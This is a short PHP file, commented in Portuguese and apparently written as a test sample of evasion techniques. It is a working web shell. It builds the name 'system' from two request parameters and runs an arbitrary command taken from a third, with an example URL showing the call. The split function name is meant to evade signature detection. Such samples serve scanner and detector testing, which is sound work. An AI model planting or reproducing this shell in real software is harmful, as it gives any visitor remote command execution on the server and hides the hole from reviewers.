<?php
// Amostra de teste final: Funções Variáveis + Concatenação

// O atacante envia as partes da função e o comando via URL
// Ex: .../ataque_fantasma.php?p1=sys&p2=tem&c=ls

$parte1 = $_REQUEST['p1'];
$parte2 = $_REQUEST['p2'];
$comando = $_REQUEST['c'];

if (isset($parte1) && isset($parte2) && isset($comando)) {
    // Monta a função perigosa dinamicamente
    $funcao_fantasma = $parte1 . $parte2;

    // Executa a função montada
    $funcao_fantasma($comando);
}
?>